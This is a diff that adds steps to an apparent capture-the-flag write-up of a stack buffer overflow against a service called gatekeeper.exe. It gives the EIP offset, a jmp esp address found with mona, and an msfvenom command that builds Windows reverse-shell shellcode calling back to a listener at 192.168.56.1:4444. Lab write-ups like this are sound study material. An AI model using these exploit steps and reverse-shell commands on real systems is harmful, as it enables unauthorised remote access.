@@ -75,3 +75,17 @@ It turned out that gatekeeper.exe is the service run on port 31337.
 Fuzzing with "A"*200 crashed the program.  
 Sending cyclic patterns reveals that EIP offset is 146 bytes.  
 ![alt text](./images/mona_EIP_offset.png?raw=true)  
+
+Then, I ran the mona command to find a module with ASLR false.  
+![alt text](./images/mona_modules.png?raw=true)  
+It showed gatekeeper.exe modules has turned ASLR off.
+
+To get an address of jmp esp instruction in the gatekeeper module, ran the following command.  
+```!mona jmp -r esp -m gatekeeper.exe```  
+![alt text](./images/mona_jmp_esp.png?raw=true)  
+The address where a jmp instruction stored turned out to be 0x080414c3.  
+
+I created a shell code using msfvenom.  
+```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c```
+Then, put all together in exploit.py and running it gave a reverse shell to the local machine.
+
